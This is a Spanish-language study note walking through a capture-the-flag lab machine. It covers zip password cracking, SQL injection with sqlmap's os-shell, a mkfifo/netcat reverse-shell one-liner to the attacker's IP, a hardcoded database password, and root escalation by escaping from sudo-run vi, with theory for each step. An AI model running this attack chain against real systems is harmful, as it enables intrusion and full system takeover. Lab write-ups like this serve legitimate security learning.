![[Pasted image 20260701115420.png]]
![[Pasted image 20260701124018.png]]![[Pasted image 20260701124004.png]]

![[Pasted image 20260701124558.png]]Ahora al intentar descomprimirlo no tenemos la contraseña que podemos hacer usar el john ripper
Para empezar podemos hacer el john pero desde el zip para meterlo en un hash.txt
El orden sería:

1. `zip2john` → extraer hash
2. `john` → crackear hash y obtener contraseña
3. `unzip` → descomprimir con la contraseña obtenida

```
zip2john backup.zip > hash.txt
```

![[Pasted image 20260701124800.png]]

Ahora metemos esa contraseña y podemos descomprimirlo nos dan dos archivos un index.php y un style asi que vamos a verlo. Tenemos una contraseña hasheado asi que entramos en una pagina para descomprimirlo y asi tenemos la contraseña

![[Pasted image 20260701125231.png]]
![[Pasted image 20260701125731.png]]


![[Pasted image 20260701183843.png]]

### 3. Lanzar sqlmap con esa cookie

```
sqlmap -u "http://10.129.71.241/dashboard.php?search=1" --cookie="PHPSESSID=tu_cookie" --os-shell --flush-session
```

(sin `--technique=U`, porque `--os-shell` necesita stacked queries, no UNION)

### 4. Buscar la user flag desde la os-shell

```
os-shell> id
os-shell> ls -la /home/
os-shell> ls -la /var/lib/postgresql/
os-shell> cat /var/lib/postgresql/user.txt
```

### 5. Montar la reverse shell

En tu Parrot, terminal aparte:

```
nc -lvnp 4444
```

Averiguar tu IP de VPN:

```
ip a show tun0
```

Desde la `os-shell>`:

```
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP 4444 >/tmp/f
```

### 6. Mejorar la shell a tty completa

En la ventana del `nc`, tras ver "Connection received":

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 7. Encontrar la contraseña de postgres

```
find / -iname "*.php" 2>/dev/null
cat /var/www/html/dashboard.php
```

→ contraseña encontrada en el código: `P@s5w0rd!`

### 8. Ver qué puede ejecutar postgres con sudo

```
sudo -l
```

(contraseña: `P@s5w0rd!`)  
→ resultado: `(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf`

### 9. Escalar a root con vi

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro de vi, en modo comando:

```
:!/bin/bash
```

### 10. Leer la root flag

```
cat /root/root.txt
```

Estabas como usuario `postgres`. Comprobaste con `sudo -l` qué podías ejecutar como root, y la respuesta fue:

```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Es decir: `postgres` tenía permiso para ejecutar `vi`, pero **solo con ese archivo concreto**, y usando `sudo` (que te pedía contraseña, a diferencia del SUID que veíamos en Oopsie, que no pide nada porque el permiso ya está "incrustado" en el propio archivo).

### ¿Qué es GTFOBins, el concepto?

Es el nombre que le da la comunidad de seguridad a un patrón muy concreto: **muchísimos programas legítimos de Unix/Linux tienen, por diseño, la capacidad de ejecutar comandos externos desde dentro de sí mismos**, porque es una funcionalidad útil para el usuario normal. No es un fallo de programación como el de `bugtracker` (que llamaba a `cat` sin ruta completa) — es una funcionalidad **intencionada** del programa, que se vuelve peligrosa solo cuando ese programa tiene privilegios elevados que no debería tener (via sudo o SUID).

Ejemplos de esta idea en varios programas conocidos:

- `vi`/`vim`: puedes ejecutar comandos de shell desde el modo de comandos con `:!comando`
- `less`/`more`: puedes escribir `!comando` mientras estás viendo un archivo
- `find`: tiene una opción `-exec` que ejecuta comandos sobre los archivos encontrados
- `python`, `perl`, `awk`: casi cualquier lenguaje de scripting tiene una función para invocar el sistema operativo desde dentro del propio programa

La web **gtfobins.github.io** es literalmente un catálogo: buscas el nombre de un binario, y te dice exactamente qué comando usar para "escapar" de él si tienes permisos de sudo o SUID sobre ese binario en concreto. Vale la pena que la tengas guardada, te la vas a encontrar mucho.

### El paso a paso que hicimos, explicado de nuevo

**1.** Ejecutamos vi, pasando como parámetro el único archivo permitido por la regla de sudo:

bash

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Esto abre `vi`, mostrando el contenido de ese archivo en pantalla, en modo edición normal. Hasta aquí, nada especial — es exactamente lo que la regla de sudo permite.

**2.** Una vez dentro de `vi`, en modo normal (no edición), escribimos:

```
:!/bin/bash
```

Aquí vamos a diseccionar esto letra a letra, porque es lo importante:

- `:` → en vi, esto te lleva del "modo normal" al "modo comando" — es donde escribes instrucciones para el propio editor (guardar con `:w`, salir con `:q`, buscar con `:/texto`, etc.)
- `!` → dentro del modo comando, este símbolo específicamente le dice a vi: "no ejecutes una instrucción interna tuya, ejecuta esto como un comando del sistema operativo"
- `/bin/bash` → el comando que queremos que ejecute: abrir una nueva shell de bash

**3.** El resultado: vi, obedientemente, lanza un proceso nuevo (`/bin/bash`) como si fuera tú quien lo pidiera desde una terminal normal. **Pero aquí está la clave**: ese proceso nuevo es **hijo** del proceso `vi` que lo lanzó. Y en Unix/Linux, cuando un proceso lanza otro proceso, el hijo **hereda los privilegios de ejecución del padre**.

Como el `vi` que teníamos abierto se había lanzado con `sudo` (o sea, corriendo como root en ese momento), el `/bin/bash` que `vi` lanza también corre como root. El prompt cambió de `postgres@vaccine:...$` a `root@vaccine:...#` — confirmando el cambio de privilegios.

### Comparación directa con PATH hijacking, para que veas la diferencia de fondo

||**GTFOBins (vi)**|**PATH hijacking (bugtracker)**|
|---|---|---|
|**Qué se abusa**|Una función _interna_ del programa, puesta ahí a propósito por sus creadores|Un _descuido_ de programación: llamar a otro comando sin decir su ruta exacta|
|**Cómo se activa**|Escribiendo una instrucción dentro del propio programa (`:!comando`)|Manipulando una variable de entorno (`$PATH`) _antes_ de ejecutar el programa vulnerable|
|**Se necesita crear algún archivo falso?**|No|Sí, un ejecutable con el mismo nombre que el comando legítimo|
|**Concepto Unix que explota**|Herencia de privilegios entre proceso padre e hijo|Orden de búsqueda de comandos en el sistema, cuando no se especifica la ruta completa|

Ambas técnicas llegan al mismo sitio final (una shell con privilegios elevados), pero por caminos conceptualmente distintos. Por eso es tan importante, cuando encuentres un programa con SUID o permiso de sudo, primero **investigar qué hace ese programa concreto** (con `strings`, viendo su comportamiento, o mirando en GTFOBins si es un binario conocido) — porque la vía de ataque exacta depende de cómo esté "roto" ese binario en particular.
## Teoria de lo que hacemos al final
### 1. ¿Qué es exactamente la `os-shell` de sqlmap?

Cuando una base de datos tiene una vulnerabilidad muy grave llamada **stacked queries** (que ahora te explico), sqlmap puede aprovecharla para no solo leer datos de la base de datos, sino **ejecutar comandos del sistema operativo** a través de ella. Es decir, en vez de preguntarle a la base de datos "dame la lista de coches", le dices "ejecuta este comando de Linux por mí".

`os-shell>` es literalmente eso: un intérprete de comandos, pero cada comando que escribes ahí no se ejecuta directamente — sqlmap lo **traduce a una consulta SQL maliciosa**, la manda al servidor web, el servidor la pasa a PostgreSQL, y PostgreSQL (con permisos especiales que tenía mal configurados) ejecuta ese comando en el sistema operativo. El resultado vuelve por el mismo camino inverso hasta que lo ves en tu pantalla.

**¿Por qué esto es tan lento y raro comparado con una terminal normal?** Porque cada comando que escribes en `os-shell>` implica todo ese viaje de ida y vuelta a través de peticiones HTTP y consultas SQL. No es una conexión directa y persistente como una terminal SSH — es una simulación, comando a comando, cada uno independiente del anterior.

### 2. UNION vs Stacked Queries — por qué importaba tanto

Hay varias "técnicas" de inyección SQL, pero dos que nos afectaron:

- **UNION**: sirve para **leer** datos combinando el resultado de tu consulta maliciosa con la consulta original de la web. Es como colarte en la respuesta de una pregunta que la web ya iba a hacer. Muy útil para robar datos (usuarios, contraseñas de la BD), pero **no** para ejecutar comandos del sistema operativo.
- **Stacked queries**: significa que la base de datos permite **encadenar varias consultas separadas por `;`** en una sola petición. Esto es mucho más peligroso, porque en vez de solo "leer" datos, puedes literalmente decirle a la base de datos "ejecuta esta consulta, Y ADEMÁS ejecuta esta otra cosa que yo quiero". `--os-shell` de sqlmap **necesita específicamente esto**, porque para ejecutar comandos del sistema operativo necesita mandar consultas SQL especiales que solo funcionan si puedes encadenarlas.

Por eso, cuando forzaste `--technique=U` (solo UNION), sqlmap podía leer datos perfectamente, pero **nunca** iba a poder darte una os-shell, por mucho que insistieras — eran herramientas para trabajos distintos.

### 3. La reverse shell — por qué la necesitábamos

Ya te expliqué antes que `os-shell>` va comando a comando, sin memoria entre uno y otro (por ejemplo, si haces `cd /home`, el siguiente comando NO recuerda que estás en `/home`, porque cada comando es una petición HTTP nueva e independiente).

Esto hace que sea **imposible usar programas interactivos** como `vi` desde ahí, porque `vi` necesita una conversación en tiempo real contigo (tú pulsas teclas, él reacciona en pantalla al instante). La os-shell no puede ofrecer eso.

La solución es conseguir una **conexión directa y persistente** entre tu máquina y la víctima — eso es una reverse shell. La idea es:

- Tú te pones a "escuchar" en un puerto de tu propia máquina con `nc -lvnp 4444` (como si dejaras el teléfono descolgado esperando que te llamen)
- Le mandas UN ÚNICO comando a la máquina víctima (a través de la os-shell, la última vez que la vamos a usar) que le dice "abre una conexión hacia la IP y puerto de mi Parrot, y conecta tu terminal a esa conexión"
- Cuando la víctima ejecuta eso, se conecta a tu `nc`, y a partir de ahí tienes un canal **directo y continuo** entre las dos máquinas — ya no dependes de sqlmap ni de peticiones HTTP sueltas

El comando raro con `mkfifo` que usamos es solo una forma técnica de "unir" la entrada y salida de una shell del sistema víctima con la conexión de red hacia ti, para que puedas escribir comandos y ver las respuestas en tiempo real, como si estuvieras dentro de esa máquina.

### 4. Por qué la primera reverse shell no era "suficiente" (lo del `pty.spawn`)

Cuando conseguiste la conexión con `nc`, tenías shell, sí — pero era una shell **"tonta"**, sin las capacidades de una terminal real: no soportaba atajos de teclado, autocompletado, y sobre todo, **no tenía "tty"**.

**¿Qué es una tty?** Es el concepto de "terminal" en sí — el sistema que gestiona la entrada/salida interactiva, permite que programas como `vi` dibujen pantallas completas, gestionen el cursor, reaccionen a teclas especiales, etc. Sin tty, un programa como `vi` simplemente no puede funcionar como se espera.

El comando de Python (`pty.spawn`) le pide al sistema operativo que cree una tty falsa (pero funcionalmente real) y meta una shell de bash dentro de ella. A partir de ahí, tu conexión se comporta como una terminal de verdad — por eso después de ese comando pudiste usar `vi` con normalidad.

### 5. Por qué `sudo -l` fallaba y qué eran esas contraseñas

Aquí nos liamos bastante, así que vamos despacio. `sudo` es el comando que te deja ejecutar cosas como si fueras otro usuario (normalmente root), pero solo si:

- El sistema tiene una regla configurada que dice "este usuario puede ejecutar ESTE comando concreto como root"
- Y, salvo que esa regla diga específicamente "sin contraseña" (NOPASSWD), tienes que autenticarte con la contraseña del propio usuario que eres (en este caso, `postgres`)

El problema al principio (desde la `os-shell` de sqlmap) era que sudo ni siquiera podía pedirte la contraseña, porque no había tty (mismo problema del punto 4). Una vez conseguimos tty real con la reverse shell, sudo ya podía funcionar normal, pero seguía pidiéndote una contraseña que no teníamos.

**¿Cómo conseguimos esa contraseña?** Leyendo el código fuente de la aplicación web (`dashboard.php`), donde encontramos, escrita literalmente en el código, la contraseña que la web usaba para conectarse a la base de datos: `P@s5w0rd!`. Como el mismo usuario del sistema (`postgres`) suele tener la misma contraseña para todo (mala práctica muy común, pero clave en esta máquina), esa contraseña también servía para autenticarte con `sudo`.

### 6. Por qué `/bin/vi` a secas no funcionaba, pero con la ruta exacta sí

Cuando por fin `sudo -l` funcionó, vimos la regla EXACTA que el administrador había configurado:

```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Esto significa: "postgres puede ejecutar `/bin/vi`, pero **solo si el argumento es exactamente ese archivo**". `sudo` compara la orden que tú escribes carácter por carácter contra esta regla. Si escribes `sudo /bin/vi` sin más (sin el archivo), o con otro archivo, no coincide con la regla, y por tanto sudo lo rechaza como si no tuvieras ningún permiso especial.

### 7. El truco final — escapar de `vi` a una shell de root

Este es el corazón de la vulnerabilidad de la máquina: **da igual que la regla de sudo te limite a un archivo concreto**, porque `vi` (como casi todos los editores de texto tipo Unix) tiene una función interna para **ejecutar comandos del sistema operativo desde dentro del propio editor** — es una funcionalidad legítima, pensada por ejemplo para que puedas comprobar algo en la terminal sin cerrar el archivo que estás editando.

El comando `:!/bin/bash` le dice a `vi`: "sal del modo edición, entra en modo comando (`:`), y ejecuta (`!`) este programa del sistema (`/bin/bash`)".

Aquí está la clave de la escalada: **el proceso hijo que lanza un programa hereda los privilegios del proceso padre**. Como `vi` se estaba ejecutando como **root** (por el sudo), el `/bin/bash` que `vi` lanza internamente **también se ejecuta como root** — aunque tú, como usuario, sigues siendo `postgres`. Es básicamente un "descuido" de diseño: la regla de sudo controlaba qué archivo podía abrir `vi`, pero no controlaba (ni podía controlar fácilmente) lo que `vi` hiciera una vez abierto por dentro.

Por eso, al ejecutar ese comando, tu prompt cambió de `postgres@vaccine:...$` a `root@vaccine:...#` — ya no eras `postgres` con privilegios limitados, eras **root**, el usuario con control total del sistema.